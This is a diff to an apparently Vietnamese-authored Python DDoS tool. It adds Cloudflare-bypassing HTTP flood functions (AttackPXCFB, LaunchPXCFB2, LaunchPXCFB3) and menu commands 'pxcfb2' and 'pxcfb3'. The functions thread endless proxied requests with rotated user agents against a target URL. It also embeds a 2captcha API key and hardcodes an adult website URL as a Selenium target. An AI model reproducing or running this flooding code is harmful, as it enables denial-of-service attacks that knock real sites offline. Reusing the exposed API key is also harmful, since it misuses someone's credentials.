@@ -544,47 +544,9 @@ def AttackCFB(url, until_datetime, scraper):
 
 
 
-def AttackPXCFB(url, until_datetime, scraper,proxy,th):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
 
-            for _ in range(5000000):
-                if proxy:
-                    proxy_url = f"http://{proxy[0]}:{proxy[1]}"
-                    print(proxy_url+'----proxy-url')
-                    proxies = {
-                        'http': proxy_url,
-                        'https': proxy_url,
-
-                     }
-                    headers = {
-                    'User-Agent': random.choice(ua),
-
-                    }
-
-                    response = scraper.get(url,headers=headers, proxies=proxies)
-                    # response = scraper.get(url,headers=headers)
-                    print('Page status:',  response.status_code)
-
-                else:
-                    print('proxy rỗng')
-        except Exception as e:
-            print('falid--------------',e)
-            break
         
-def AttackPXCFB3(url, until_datetime, scraper,proxies,th):
-    try:
-        driver = webdriver.Chrome( )
-        # Define the URL you want to scrape
-        url = 'https://xvideos68.com'
-        for _ in range(50):
-            driver.get(url)
-            # Get the page title
-            page_title = driver.title
-            print(page_title)
-    except Exception as e:
-        print('falid--------------',e)
-        
+
 def LaunchPXCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper( browser={
@@ -607,11 +569,89 @@ def LaunchPXCFB(url, th, t):
 
             except:
                 print('teo--------------',proxy)
-
                 pass
+def AttackPXCFB(url, until_datetime, scraper,proxy,th):
+    while True:
+        try:
+                proxy_url = f"http://{proxy[0]}:{proxy[1]}"
+                print(proxy_url+'----proxy-url')
+                proxies = {
+                    'http': proxy_url,
+                    'https': proxy_url,
+
+                    }
+                headers = {
+                'User-Agent': random.choice(ua),
+
+                }
+
+                response = scraper.get(url,headers=headers, proxies=proxies)
+                # response = scraper.get(url,headers=headers)
+                print('Page status:',  response.status_code)
+        except Exception as e:
+            print('falid--------------',e)
+            pass
         # Start all threads
         
+def LaunchPXCFB3(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper( browser={
 
+    'provider': '2captcha',
+
+    'api_key': 'ef9e368b1b69cadb030fa20473ccd0c4'
+
+    })
+    proxies = open("./proxy.txt", 'r').read().split('\n')
+
+    if isinstance(proxies, list) and proxies:
+
+        for i in range(int(th)):
+            try:
+                proxy = random.choice(proxies).strip().split(":")
+                thd = threading.Thread(target=AttackPXCFB3, args=(url, until, scraper,proxy,th))
+                thd.start()
+               
+
+            except:
+                print('teo--------------',proxy)
+                pass
+def AttackPXCFB3(url, until_datetime, scraper,proxies,th):
+    try:
+        driver = webdriver.Chrome( )
+        # Define the URL you want to scrape
+        url = 'https://xvideos68.com'
+        for _ in range(50):
+            driver.get(url)
+            # Get the page title
+            page_title = driver.title
+            print(page_title)
+    except Exception as e:
+        print('falid--------------',e)
+             
+def LaunchPXCFB2(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper( browser={
+
+    'provider': '2captcha',
+
+    'api_key': 'ef9e368b1b69cadb030fa20473ccd0c4'
+
+    })
+    proxies = open("./proxy.txt", 'r').read().split('\n')
+
+    if isinstance(proxies, list) and proxies:
+
+        for i in range(int(th)):
+            try:
+                proxy = random.choice(proxies).strip().split(":")
+                thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxy,th))
+                thd.start()
+               
+
+            except:
+                print('teo--------------',proxy)
+                pass
 def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
         driver = None
 
@@ -1244,6 +1284,20 @@ def command():
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchPXCFB(target, thread, t)
+            timer.join()
+    elif command == "pxcfb2" or command == "PXCFB2":
+        if get_proxies():
+            target, thread, t = get_info_l7()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXCFB2(target, thread, t)
+            timer.join()
+    elif command == "pxcfb3" or command == "PXCFB3":
+        if get_proxies():
+            target, thread, t = get_info_l7()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXCFB3(target, thread, t)
             timer.join()
     elif command == "pps" or command == "PPS":
         target, thread, t = get_info_l7()
